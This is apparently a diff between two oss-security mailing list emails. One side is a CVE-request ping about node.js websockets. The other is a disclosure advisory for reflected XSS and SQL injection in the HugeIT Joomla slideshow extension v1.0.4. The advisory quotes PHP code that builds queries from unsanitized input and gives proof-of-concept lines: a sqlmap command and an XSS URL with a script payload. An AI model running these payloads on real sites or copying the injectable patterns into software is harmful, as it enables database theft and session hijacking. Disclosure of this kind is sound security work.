@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1814" "Tuesday" "19" "January" "2016" "13:55:31" "-0700" "Kurt Seifried" "kseifried@redhat.com" "<CANO=Ty01JdpAZ8rtXhrOyzZ7EKCV65kzkVQid4420Q6K3mhugw@mail.gmail.com>" "54" "[oss-security] Re: CVE for node.js websockets (ws)" "^Cc:" nil nil "1" "2016011920:55:31" "[oss-security] Re: CVE for node.js websockets (ws)" (number mark "        kseifried@re Jan 19   54/1814  " thread-indent "\"[oss-security] Re: CVE for node.js websockets (ws)\"\n") "<20160112083910.313881BE690@smtpvbsrv1.mitre.org>" ("<CANO=Ty2__zBT=MeY=6mQaepEM1vr=igkrmeZkX3XM5pwttEbEg@mail.gmail.com>" "<20160112083910.313881BE690@smtpvbsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4607" "Tuesday" "26" "July" "2016" "08:35:32" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<CC1DF991-C97A-45A4-901A-FCC32780778D@me.com>" "112" "[oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4" nil nil nil "7" "2016072612:35:32" "[oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4" (number mark "U       larry0@me.co Jul 26  112/4607  " thread-indent "\"[oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 9305 invoked by uid 550); 19 Jan 2016 20:55:44 -0000
+Received: (qmail 9253 invoked by uid 550); 26 Jul 2016 12:36:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,85 +11,142 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 9284 invoked from network); 19 Jan 2016 20:55:44 -0000
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:in-reply-to:references:date
-         :message-id:subject:from:to:cc:content-type;
-        bh=ToB29fSqJRj7x/HWCrDgkDigbDLsjXRR12tmmcUGbBw=;
-        b=XLmr2vCcCs0tPZVnRMs086w5vvDefJqE2Unw2peFTAGpJ+UVVkPIkZMi3iSMSx9iYg
-         w+qHuEBiJlqZ8uG3BoX80Q9YeB7JAv8uM+IH5lqNO/hlI3u5PxhY9rUXyn39VHI7ZeLQ
-         zRWkbg8vHtKUzcAkwEyESWaixy/d5maTgLMVK5OkWMCqCoUR7V/48ZnQTfxXenCTprSw
-         gp2HrbLPziLBxrBaezWoWShmR8mC7QOrLcaHawhbEc5UYPJuKB8eIIFcdcXhh+fjpgUI
-         lQAufenbYAOh9xlDhc0fvhPqCZlZKa7vwmC2pCB50vgaTJ7uRZU6iYmJFLoloehBhcRe
-         6j1Q==
-X-Gm-Message-State: ALoCoQkbF8Mnp8pjL3p1BDwHGdrTruSUsTe/GDAmHxfwBnHbu92y44HuWOSKLmGeCgLkkaLT3UZmQfdSJhlhlu7I07YGu/SiDb4V+Vi5Gg0CNkDaNNf7t9g=
-MIME-Version: 1.0
-X-Received: by 10.37.29.194 with SMTP id d185mr9042153ybd.109.1453236932019;
- Tue, 19 Jan 2016 12:55:32 -0800 (PST)
-In-Reply-To: <20160112083910.313881BE690@smtpvbsrv1.mitre.org>
-References: <CANO=Ty2__zBT=MeY=6mQaepEM1vr=igkrmeZkX3XM5pwttEbEg@mail.gmail.com>
-	<20160112083910.313881BE690@smtpvbsrv1.mitre.org>
-Message-ID: <CANO=Ty01JdpAZ8rtXhrOyzZ7EKCV65kzkVQid4420Q6K3mhugw@mail.gmail.com>
-Content-Type: multipart/alternative; boundary=001a11428d0e1bc3500529b6176e
-Cc: oss-security <oss-security@lists.openwall.com>
-Date: Tue, 19 Jan 2016 13:55:31 -0700
-From: Kurt Seifried <kseifried@redhat.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: CVE for node.js websockets (ws)
-To: CVE ID Requests <cve-assign@mitre.org>
+Received: (qmail 8154 invoked from network); 26 Jul 2016 12:35:51 -0000
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2016-07-26_09:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1603290000 definitions=main-1607260142
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <CC1DF991-C97A-45A4-901A-FCC32780778D@me.com>
+Date: Tue, 26 Jul 2016 08:35:32 -0400
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1469536534; bh=yi6FWtxv/Q1ccdjIwSOjMSPri3UyvWg1rOR/OBHVUEU=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=DligJleTwLil6VK4Yt0Orwg9ou1kqJMCLd0YFgVNodSyzhXEF6RLxIbJ6dDyTE1ok
+ Gyc3Z20GoJjJIZIbyj//rPRfF8GdlBP1ft9+3T9FasvhAVEbQgrO0hXvWLtLjvo6I9
+ 0UZ0Oc0Zn8CI0XPApVL6BPGv0nbMgvtfiGgSLY/KdzALOBv1Y5oAfh3xSLZm42Qd9B
+ EpgDPYhou0zIeO+ZJBe1KbE220WEstX1Nym7kMILESlmGbE7LML9MDyTDUy+FIK9ZN
+ Sf0bCiESveikXuqJKEOLHa0ewYxRLOnJYyu7Fdq1Dgomstrg+K8Z/ye6eAyTzcSbai
+ x8CeldscuCksg==
+Subject: [oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4
 
---001a11428d0e1bc3500529b6176e
-Content-Type: text/plain; charset=UTF-8
+Title: Reflected XSS & SQLi in HugeIT slideshow v1.0.4
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-07-17
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-i=
+mages/slideshow/slideshow
+Vendor: www.hugeit.com
+Vendor Notified: 2016-07-17, fixed in v1.0.6
+Vendor Contact: info@huge-it.com
+Description: Huge-IT Slideshow Extension is one of the powerful products th=
+at our company offers. It gives style and charm to your site and help to at=
+tract the attention of visitors to certain parts of the content.
+Vulnerability:
+The attacker must be logged in with at least manager level access or access=
+ to the administrative panel to exploit this vulnerability.
 
-Ping, is there a CVE for this yet?
-
-On Tue, Jan 12, 2016 at 1:39 AM, <cve-assign@mitre.org> wrote:
-
-> -----BEGIN PGP SIGNED MESSAGE-----
-> Hash: SHA256
->
-> > CVE-PENDING - Credit: Feross Aboukhadijeh / Mathias Buss
->
-> > If not who is sitting on it?
->
-> In our experience, the string "CVE-PENDING" has little or no
-> correlation with whether anyone has done any type of CVE request.
->
-> We'll interpret it as a new request to MITRE unless someone else
-> happens to have received a request.
->
-> - --
-> CVE assignment team, MITRE CVE Numbering Authority
-> M/S M300
-> 202 Burlington Road, Bedford, MA 01730 USA
-> [ PGP key available through http://cve.mitre.org/cve/request_id.html ]
-> -----BEGIN PGP SIGNATURE-----
-> Version: GnuPG v1
->
-> iQIcBAEBCAAGBQJWlLsuAAoJEL54rhJi8gl5i4EQAKA7AGwYRYJDipd7vpWlnaqb
-> Wv7BkC2i1oDLUbb9xQX9AMTGyQD90Q0XP72EUeSqDUHNRAXobcAavVRmbk14Hib3
-> TqL/ckDnwWpXMgRyyyhVTLkr4ajl/T0B+QgAN4UhE5ts0YPqeJnWK2ZTxl+yfYny
-> KYhOH3bIQEEuH77XjzsN9dZAI/UnupQRAGFzwGVI4HngxUz2RQdCDrIe0Vk5L/+V
-> bL34Gm0h4Ij4/K15FS4DGeuYHTKtBM1uPHt9DKDdqkjy9YxYm3gX4ALh3dtKesnf
-> vScCIXXs1M5XGM4oREinaDLwN1ZqV29xzpQ6NWfVPZ/eADLHwRVLCtk/nK/IDeUp
-> SAqgWYpCXZluq3KNJLbIwlk9Cw4NpBdzqq3QC2ey5Hy4Dznix+Qq0hXjAzRq/3KB
-> ZXqXgQhtcpnWTaOF9j4823UzZtDHY+UbpIkGv/BstWxtaFOwWCLA9pcuhj2VoUal
-> voHIJiObb9ji325bD2jsQadmAMGG2tDVU8HkvVXmyCmz28b3jyw0/BoAWcUWfyRa
-> qy17X1WGUkWVR3UbW69qMgv5zD+dwv2cZHbP1urylgxVO15mPqwuhSwRjP1DuJU2
-> HXZNp3F3oU6y3Zf+9dwaC1vThDlrM/qq731sh/b3A7DAftpXAjkbHzCOwziM/rcs
-> 8dm8oDFJmGuW1J/mkWaI
-> =mvzn
-> -----END PGP SIGNATURE-----
->
+The following functions in ./models/slideshow.php are vulnerable to SQL inj=
+ection as all parameters being passed to them are not sanitized:
 
 
+ 51     public function getPropertie() {
+ 52         $db =3D JFactory::getDBO();
+ 53         $id_cat =3D JRequest::getVar('id');
+ 54         $query =3D $db->getQuery(true);
+ 55         $query->select('#__huge_itslideshow_images.name as name,'
+ 56                 . '#__huge_itslideshow_images.id ,'
+ 57                 . '#__huge_itslideshow_slideshows.name as portName,'
+ 58                 . 'slideshow_id, #__huge_itslideshow_images.description=
+ as     description,image_url,sl_url,sl_type,link_target,#__huge_itslidesho=
+w_imag    es.ordering,#__huge_itslideshow_images.published,published_in_sl_=
+width');
+ 59         $query->from(array('#__huge_itslideshow_slideshows' =3D> '#__hu=
+ge_it    slideshow_slideshows', '#__huge_itslideshow_images' =3D> '#__huge_=
+itslidesho    w_images'));
+ 60         $query->where('#__huge_itslideshow_slideshows.id =3D slideshow_=
+id')-    >where('slideshow_id=3D' . $id_cat);
+ 61         $query->order('ordering desc');
+ 62         $db->setQuery($query);
+ 63         $results =3D $db->loadObjectList();
+ 64         return $results;
+ 65     }=20=20=20
 
--- 
 
---
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@redhat.com
 
---001a11428d0e1bc3500529b6176e--
+ 67     public function getImageByID() {
+ 68         $db =3D JFactory::getDBO();
+ 69         $id_cat =3D JRequest::getVar('id');
+ 70         $query =3D $db->getQuery(true);
+ 71         $query->select('*');
+ 72         $query->from('#__huge_itslideshow_images');
+ 73         $query->where('slideshow_id=3D' . $id_cat);
+ 74         $db->setQuery($query);
+ 75         $results =3D $db->loadObjectList();
+ 76         return $results;
+ 77     }=20
+
+
+
+  79    public function save($data) {
+ 80         $db =3D JFactory::getDBO();
+ 81         $result =3D $this->getPropertie();
+ 82         $this->updarteSlideshow();
+ 83         $this->selectStyle();
+ 84         foreach ($result as $key =3D> $value) {
+ 85             $imageId =3D $value->id;
+ 86             $id =3D $data['imageId'. $imageId];
+ 87             $titleimage =3D $data['titleimage' . $imageId];
+ 88             $im_description =3D $data['im_description'. $imageId];
+ 89             $sl_url =3D $data['sl_url'. $imageId];
+ 90             $sl_link_target =3D $data['sl_link_target'. $imageId];
+ 91             $ordering =3D $data['order_by_'. $imageId];
+ 92             $image_url =3D $data['image_url'. $imageId];
+ 93=20
+ 94             $query =3D $db->getQuery(true);
+ 95             $query->update('#__huge_itslideshow_images')->set('name=3D"=
+' . $    titleimage . '"')->set('description=3D"' . $im_description . '"')
+ 96                     ->set('sl_url=3D"' . $sl_url . '"')->set('link_targ=
+et=3D"'     . $sl_link_target . '"')
+ 97                     ->set('ordering=3D"' . $ordering . '"')->set('image=
+_url=3D    "' . $image_url . '"')->where('id=3D' . $imageId);
+ 98             $db->setQuery($query);
+ 99             $db->execute();
+
+The rest of these source files all have similar vulnerabilities:
+
+./models/fields/slideshow.php
+./models/slideshows.php
+./models/video.php
+./models/forms/general.php
+./models/general.php
+
+
+Refective XSS in ./views/slideshow/tmpl/default.php in id parameter.
+
+117:  <a class=3D"modal" rel=3D"{handler: 'iframe', size: {x: 800, y: 500}}=
+" href=3D"index.php?option=3Dcom_slideshow&view=3Dvideo&tmpl=3Dcomponent&pi=
+d=3D<?php echo $_GET['id']; ?>" title=3D"Video" >
+
+CVE-2016-1000117 XSS
+CVE-2016-1000118 SQLi
+
+Exploit Code:
+	=E2=80=A2 SQLi:
+	=E2=80=A2=20=20
+	=E2=80=A2 $ sqlmap  --load-cookies=3Dcookies.txt -u "http://192.168.0.125/=
+administrator/index.php?option=3Dcom_slideshow&view=3Dslideshow&id=3D*" --d=
+bms mysql=20
+	=E2=80=A2=20=20
+	=E2=80=A2 XSS:
+	=E2=80=A2=20=20
+	=E2=80=A2 http://192.168.0.125/administrator/index.php?option=3Dcom_slides=
+how&view=3Dslideshow&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D166=
